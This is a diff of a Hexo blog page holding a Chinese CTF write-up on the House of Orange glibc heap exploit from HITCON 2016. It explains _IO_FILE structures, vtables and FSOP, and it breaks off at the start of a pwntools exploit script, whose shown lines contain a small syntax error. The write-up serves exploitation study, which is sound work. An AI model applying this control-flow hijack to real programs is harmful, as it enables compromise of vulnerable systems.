@@ -1,13 +1,360 @@
-<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="2016-Hitcon-House_of_Orange"><meta name="keywords" content><meta name="author" content="Po1lux"><meta name="copyright" content="Po1lux"><title>2016-Hitcon-House_of_Orange | Po1lux's Diary</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  }
-} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-FILE、-IO-FILE、-IO-FILE-plus、-IO-list-all、vtable是什么"><span class="toc-number">1.</span> <span class="toc-text">0x00 FILE、_IO_FILE、_IO_FILE_plus、_IO_list_all、vtable是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-为什么unsortedbin中的chunk会变成smallbin-chunk，以及unsortedbin-attack的说明"><span class="toc-number">2.</span> <span class="toc-text">0x01 为什么unsortedbin中的chunk会变成smallbin chunk，以及unsortedbin attack的说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-为什么要让topchunk以brk的方式扩容"><span class="toc-number">3.</span> <span class="toc-text">0x02 为什么要让topchunk以brk的方式扩容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-为什么chunk中会泄露libc和chunk的地址"><span class="toc-number">4.</span> <span class="toc-text">0x03 为什么chunk中会泄露libc和chunk的地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-House-of-Orange程序分析"><span class="toc-number">5.</span> <span class="toc-text">0x04 House of Orange程序分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-利用过程FSOP-File-Stream-Oriented-Programming"><span class="toc-number">6.</span> <span class="toc-text">0x05 利用过程FSOP(File Stream Oriented Programming)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用的触发点"><span class="toc-number">6.1.</span> <span class="toc-text">利用的触发点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用条件"><span class="toc-number">6.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用过程"><span class="toc-number">6.3.</span> <span class="toc-text">利用过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-EXP"><span class="toc-number">7.</span> <span class="toc-text">0x06 EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-REFFERENCE"><span class="toc-number">8.</span> <span class="toc-text">0x07 REFFERENCE</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://raw.githubusercontent.com/Po1lux/Po1lux.github.io/hexo/source/images/IMG.jpg"></div><div class="author-info__name text-center">Po1lux</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">56</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">28</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">8</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://raw.githubusercontent.com/Po1lux/Po1lux.github.io/hexo/source/images/IMG_3035.JPG)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Po1lux's Diary</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="post-info"><div id="post-title">2016-Hitcon-House_of_Orange</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-27</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>House_of_Orange&#x662F;&#x6765;&#x81EA;Hitcon CTF 2016&#x4E2D;&#x7684;&#x4E00;&#x9053;&#x540C;&#x540D;&#x9898;&#x76EE;&#xFF0C;&#x662F;&#x4E00;&#x79CD;&#x901A;&#x8FC7;unstoredbin attack&#x4FEE;&#x6539;<code>_IO_list_all</code>&#x6307;&#x9488;&#xFF0C;&#x4F2A;&#x9020;<code>_IO_FILE_plus</code>&#x7ED3;&#x6784;&#x4F53;&#x548C;<code>vtable</code>&#x865A;&#x8868;&#xFF0C;&#x8FDB;&#x800C;&#x4FEE;&#x6539;&#x865A;&#x8868;&#x51FD;&#x6570;&#x52AB;&#x6301;&#x63A7;&#x5236;&#x6D41;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;glibc&#x5728;2.24&#x7248;&#x672C;&#x540E;&#x52A0;&#x5165;&#x4E86;&#x5BF9;&#x865A;&#x8868;&#x7684;&#x9A8C;&#x8BC1;&#xFF0C;&#x8FD9;&#x9898;&#x7528;&#x7684;glibc&#x7248;&#x672C;&#x662F;2.23&#xFF0C;&#x8FD8;&#x6CA1;&#x6709;&#x865A;&#x8868;&#x76F8;&#x5173;&#x7684;&#x5B89;&#x5168;&#x68C0;&#x67E5;&#x3002;</p>
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="House_of_Orange&amp;#x662F;&amp;#x6765;&amp;#x81EA;Hitcon CTF 2016&amp;#x4E2D;&amp;#x7684;&amp;#x4E00;&amp;#x9053;&amp;#x540C;&amp;#x540D;&amp;#x9898;&amp;#x76EE;&amp;#xFF0C;&amp;#x662F;&amp;#x4E00;&amp;#x79CD;&amp;#x901A;&amp;#x8FC7;unstoredbin attack&amp;#x4FEE;&amp;#x6539;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2016-Hitcon-House_of_Orange">
+<meta property="og:url" content="http://yoursite.com/2019/03/27/2016-Hitcon-House-of-Orange/index.html">
+<meta property="og:site_name" content="Po1lux&#39;s Diary">
+<meta property="og:description" content="House_of_Orange&amp;#x662F;&amp;#x6765;&amp;#x81EA;Hitcon CTF 2016&amp;#x4E2D;&amp;#x7684;&amp;#x4E00;&amp;#x9053;&amp;#x540C;&amp;#x540D;&amp;#x9898;&amp;#x76EE;&amp;#xFF0C;&amp;#x662F;&amp;#x4E00;&amp;#x79CD;&amp;#x901A;&amp;#x8FC7;unstoredbin attack&amp;#x4FEE;&amp;#x6539;">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/03/27/2016-Hitcon-House-of-Orange/IO_FILE_3df9ac2c8dabbdc5ca11a5d505598c2c-20190329100242836.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/27/2016-Hitcon-House-of-Orange/abort_routine.jpeg">
+<meta property="og:updated_time" content="2020-03-12T04:19:34.806Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2016-Hitcon-House_of_Orange">
+<meta name="twitter:description" content="House_of_Orange&amp;#x662F;&amp;#x6765;&amp;#x81EA;Hitcon CTF 2016&amp;#x4E2D;&amp;#x7684;&amp;#x4E00;&amp;#x9053;&amp;#x540C;&amp;#x540D;&amp;#x9898;&amp;#x76EE;&amp;#xFF0C;&amp;#x662F;&amp;#x4E00;&amp;#x79CD;&amp;#x901A;&amp;#x8FC7;unstoredbin attack&amp;#x4FEE;&amp;#x6539;">
+<meta name="twitter:image" content="http://yoursite.com/2019/03/27/2016-Hitcon-House-of-Orange/IO_FILE_3df9ac2c8dabbdc5ca11a5d505598c2c-20190329100242836.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/27/2016-Hitcon-House-of-Orange/">
+
+
+
+
+
+
+  <title>2016-Hitcon-House_of_Orange | Po1lux's Diary</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Po1lux's Diary</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/27/2016-Hitcon-House-of-Orange/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Po1lux">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/IMG.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Po1lux's Diary">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2016-Hitcon-House_of_Orange</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-27T00:03:06+08:00">
+                2019-03-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/03/27/2016-Hitcon-House-of-Orange/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/03/27/2016-Hitcon-House-of-Orange/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/03/27/2016-Hitcon-House-of-Orange/" class="leancloud_visitors" data-flag-title="2016-Hitcon-House_of_Orange">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>House_of_Orange&#x662F;&#x6765;&#x81EA;Hitcon CTF 2016&#x4E2D;&#x7684;&#x4E00;&#x9053;&#x540C;&#x540D;&#x9898;&#x76EE;&#xFF0C;&#x662F;&#x4E00;&#x79CD;&#x901A;&#x8FC7;unstoredbin attack&#x4FEE;&#x6539;<code>_IO_list_all</code>&#x6307;&#x9488;&#xFF0C;&#x4F2A;&#x9020;<code>_IO_FILE_plus</code>&#x7ED3;&#x6784;&#x4F53;&#x548C;<code>vtable</code>&#x865A;&#x8868;&#xFF0C;&#x8FDB;&#x800C;&#x4FEE;&#x6539;&#x865A;&#x8868;&#x51FD;&#x6570;&#x52AB;&#x6301;&#x63A7;&#x5236;&#x6D41;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;glibc&#x5728;2.24&#x7248;&#x672C;&#x540E;&#x52A0;&#x5165;&#x4E86;&#x5BF9;&#x865A;&#x8868;&#x7684;&#x9A8C;&#x8BC1;&#xFF0C;&#x8FD9;&#x9898;&#x7528;&#x7684;glibc&#x7248;&#x672C;&#x662F;2.23&#xFF0C;&#x8FD8;&#x6CA1;&#x6709;&#x865A;&#x8868;&#x76F8;&#x5173;&#x7684;&#x5B89;&#x5168;&#x68C0;&#x67E5;&#x3002;</p>
 <p>&#x7F51;&#x4E0A;&#x5173;&#x4E8E;House of Orange&#x7684;&#x8D44;&#x6599;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x6211;&#x5C31;&#x4ECE;&#x53E6;&#x4E00;&#x4E2A;&#x89D2;&#x5EA6;&#x6765;&#x8BB2;&#x4E00;&#x4E0B;&#x6211;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;&#x548C;&#x77E5;&#x8BC6;&#x70B9;&#x3002;</p>
 <h2 id="0x00-FILE&#x3001;-IO-FILE&#x3001;-IO-FILE-plus&#x3001;-IO-list-all&#x3001;vtable&#x662F;&#x4EC0;&#x4E48;"><a href="#0x00-FILE&#x3001;-IO-FILE&#x3001;-IO-FILE-plus&#x3001;-IO-list-all&#x3001;vtable&#x662F;&#x4EC0;&#x4E48;" class="headerlink" title="0x00 FILE&#x3001;_IO_FILE&#x3001;_IO_FILE_plus&#x3001;_IO_list_all&#x3001;vtable&#x662F;&#x4EC0;&#x4E48;"></a>0x00 FILE&#x3001;_IO_FILE&#x3001;_IO_FILE_plus&#x3001;_IO_list_all&#x3001;vtable&#x662F;&#x4EC0;&#x4E48;</h2><p>FILE &#x5728; Linux &#x7CFB;&#x7EDF;&#x7684;&#x6807;&#x51C6; IO &#x5E93;&#x4E2D;&#x662F;&#x7528;&#x4E8E;&#x63CF;&#x8FF0;&#x6587;&#x4EF6;&#x7684;&#x7ED3;&#x6784;&#xFF0C;&#x79F0;&#x4E3A;&#x6587;&#x4EF6;&#x6D41;&#x3002; FILE &#x7ED3;&#x6784;&#x5728;&#x7A0B;&#x5E8F;&#x6267;&#x884C; fopen &#x7B49;&#x51FD;&#x6570;&#x65F6;&#x4F1A;&#x8FDB;&#x884C;&#x521B;&#x5EFA;&#xFF0C;&#x5E76;&#x5206;&#x914D;&#x5728;&#x5806;&#x4E2D;&#x3002;FILE &#x7ED3;&#x6784;&#x5B9A;&#x4E49;&#x5728; libio.h &#x4E2D;&#xFF0C;&#x7ED3;&#x6784;&#x4F53;&#x540D;&#x4E3A;<code>_IO_FILE</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> {</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span> <span class="comment">/* offset 0x68 (64bits) */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&apos;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE <span class="comment">//&#x5F00;&#x59CB;&#x5B8F;&#x5224;&#x65AD;&#xFF08;&#x8FD9;&#x6BB5;&#x5224;&#x65AD;&#x7ED3;&#x679C;&#x4E3A;&#x5426;&#xFF0C;&#x6240;&#x4EE5;&#x6CA1;&#x6709;&#x5B9A;&#x4E49;_IO_FILE_complete&#xFF0C;&#x4E0B;&#x9762;&#x8FD8;&#x662F;_IO_FILE&#xFF09;</span></span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//&#x7ED3;&#x675F;&#x5B8F;&#x5224;&#x65AD;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001 <span class="comment">//&#x4F9D;&#x7136;&#x662F;_IO_FILE&#x7684;&#x5185;&#x5BB9;</span></span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">void</span> *__pad1;</span><br><span class="line">  <span class="keyword">void</span> *__pad2;</span><br><span class="line">  <span class="keyword">void</span> *__pad3;</span><br><span class="line">  <span class="keyword">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">size_t</span> __pad5;</span><br><span class="line">  <span class="keyword">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&apos;t get into trouble again.  */</span></span><br><span class="line">  <span class="keyword">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="keyword">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="keyword">void</span> *) - <span class="keyword">sizeof</span> (<span class="keyword">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">};</span><br></pre></td></tr></table></figure></p>
 <p><code>_IO_FILE_plus</code>&#x5404;&#x9879;&#x504F;&#x79FB;&#x5982;&#x4E0B;&#xFF1A;</p>
@@ -102,7 +449,526 @@
 </ol>
 <h2 id="0x06-EXP"><a href="#0x06-EXP" class="headerlink" title="0x06 EXP"></a>0x06 EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&apos;./houseoforange&apos;</span>)</span><br><span class="line">elf = ELF(<span class="string">&apos;./houseoforange&apos;</span>)</span><br><span class="line">libc = ELF(<span class="string">&apos;./libc&apos;</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">VERBOSE = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">if</span> VERBOSE:</span><br><span class="line">	context(log_level = <span class="string">&apos;debug&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdb</span><span class="params">(a=<span class="string">&apos;&apos;</span>)</span>:</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">  <span class="keyword">if</span> a != <span class="string">&apos;&apos;</span></span><br><span class="line">		raw_input(a)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(length,name)</span>:</span></span><br><span 